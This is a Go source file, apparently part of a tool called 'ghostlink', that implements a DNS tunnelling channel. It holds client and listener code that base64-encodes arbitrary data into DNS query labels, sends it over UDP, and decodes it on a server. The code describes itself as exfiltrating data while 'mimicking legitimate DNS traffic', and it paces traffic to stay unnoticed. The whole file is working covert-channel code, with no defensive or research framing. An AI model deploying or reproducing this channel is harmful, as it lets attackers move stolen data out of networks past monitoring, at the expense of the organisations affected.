package channel

import (
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"sync"

	"github.com/byjanke/ghostlink/pkg/traffic"
)

func init() {
	Register(DNSChannel, func() Channel {
		return &dnsChannel{
			normalizer: traffic.NewNormalizer(traffic.DNSTraffic),
		}
	}, func() Listener {
		return &dnsListener{
			clients: make(map[string]*dnsChannel),
			newConn: make(chan *dnsChannel, 100),
		}
	})
}

const dnsLabelMax = 63

type dnsChannel struct {
	conn       *net.UDPConn
	serverAddr string
	domain     string
	normalizer *traffic.Normalizer
	closed     bool

	isServer   bool
	listenConn *net.UDPConn
	clientAddr *net.UDPAddr
	dataCh     chan []byte
}

type dnsListener struct {
	conn    *net.UDPConn
	domain  string
	mu      sync.Mutex
	clients map[string]*dnsChannel
	newConn chan *dnsChannel
	running bool
}

func (c *dnsChannel) Info() ChannelInfo {
	return ChannelInfo{
		Type:        DNSChannel,
		Name:        "DNS Tunnel",
		Description: "Exfiltrates data through DNS TXT/A queries, mimicking legitimate DNS traffic",
		Capability:  0.85,
	}
}

func (c *dnsChannel) Connect(addr string) error {
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return fmt.Errorf("dns resolve: %w", err)
	}
	c.serverAddr = udpAddr.String()
	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		return fmt.Errorf("dns dial: %w", err)
	}
	c.conn = conn
	c.isServer = false
	return nil
}

func buildDNSQuery(data []byte, domain string) []byte {
	encoded := base64.RawURLEncoding.EncodeToString(data)
	var labels []string
	for i := 0; i < len(encoded); i += dnsLabelMax {
		end := i + dnsLabelMax
		if end > len(encoded) {
			end = len(encoded)
		}
		labels = append(labels, encoded[i:end])
	}
	fqdn := strings.Join(labels, ".") + "." + domain
	if len(fqdn) > 253 {
		fqdn = fqdn[:253]
	}
	var msg []byte
	msg = append(msg, 0x00, 0x01)
	msg = append(msg, 0x01, 0x00)
	msg = append(msg, 0x00, 0x01)
	msg = append(msg, 0x00, 0x00)
	msg = append(msg, 0x00, 0x00)
	msg = append(msg, 0x00, 0x00)
	for _, label := range strings.Split(fqdn, ".") {
		if label == "" {
			continue
		}
		msg = append(msg, byte(len(label)))
		msg = append(msg, []byte(label)...)
	}
	msg = append(msg, 0x00)
	msg = append(msg, 0x00, 0x10)
	msg = append(msg, 0x00, 0x01)
	return msg
}

func (c *dnsChannel) Send(data []byte) error {
	c.normalizer.WaitForSlot()
	query := buildDNSQuery(data, c.domain)

	if c.isServer {
		if c.listenConn == nil || c.clientAddr == nil {
			return fmt.Errorf("dns server: not connected to client")
		}
		_, err := c.listenConn.WriteToUDP(query, c.clientAddr)
		c.normalizer.RecordSend()
		return err
	}

	if c.conn == nil {
		return fmt.Errorf("dns: not connected")
	}
	_, err := c.conn.Write(query)
	c.normalizer.RecordSend()
	return err
}

func (c *dnsChannel) Recv() ([]byte, error) {
	if c.isServer {
		data, ok := <-c.dataCh
		if !ok {
			return nil, fmt.Errorf("dns server: channel closed")
		}
		return parseDNSQuery(data), nil
	}

	if c.conn == nil {
		return nil, fmt.Errorf("dns: not connected")
	}
	buf := make([]byte, 1500)
	n, _, err := c.conn.ReadFromUDP(buf)
	if err != nil {
		return nil, fmt.Errorf("dns recv: %w", err)
	}
	return parseDNSQuery(buf[:n]), nil
}

func parseDNSQuery(raw []byte) []byte {
	if len(raw) < 12 {
		return raw
	}
	offset := 12
	var labels []string
	for offset < len(raw) {
		labelLen := int(raw[offset])
		if labelLen == 0 {
			break
		}
		offset++
		if offset+labelLen > len(raw) {
			return raw
		}
		labels = append(labels, string(raw[offset:offset+labelLen]))
		offset += labelLen
	}
	qname := strings.Join(labels, "")
	decoded, err := base64.RawURLEncoding.DecodeString(qname)
	if err != nil {
		return raw
	}
	return decoded
}

func (c *dnsChannel) Close() error {
	if c.conn != nil {
		return c.conn.Close()
	}
	return nil
}

func (l *dnsListener) Listen(addr string) error {
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return fmt.Errorf("dns listen resolve: %w", err)
	}
	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return fmt.Errorf("dns listen: %w", err)
	}
	l.conn = conn
	l.running = true

	go l.dispatch()
	return nil
}

func (l *dnsListener) dispatch() {
	buf := make([]byte, 1500)
	for l.running {
		n, addr, err := l.conn.ReadFromUDP(buf)
		if err != nil {
			if !l.running {
				return
			}
			continue
		}

		key := addr.String()
		l.mu.Lock()
		ch, exists := l.clients[key]
		if exists {
			l.mu.Unlock()
			select {
			case ch.dataCh <- append([]byte(nil), buf[:n]...):
			default:
			}
		} else {
			ch = &dnsChannel{
				normalizer: traffic.NewNormalizer(traffic.DNSTraffic),
				isServer:   true,
				listenConn: l.conn,
				clientAddr: addr,
				dataCh:     make(chan []byte, 256),
			}
			l.clients[key] = ch
			l.mu.Unlock()

			select {
			case ch.dataCh <- append([]byte(nil), buf[:n]...):
			default:
			}
			select {
			case l.newConn <- ch:
			default:
			}
		}
	}
}

func (l *dnsListener) Accept() (Channel, net.Addr, error) {
	ch, ok := <-l.newConn
	if !ok {
		return nil, nil, fmt.Errorf("dns listener closed")
	}
	return ch, ch.clientAddr, nil
}

func (l *dnsListener) Close() error {
	l.running = false
	if l.conn != nil {
		return l.conn.Close()
	}
	return nil
}

func (c *dnsChannel) SetDomain(domain string) {
	c.domain = domain
}

func (l *dnsListener) SetDomain(domain string) {
	l.domain = domain
}
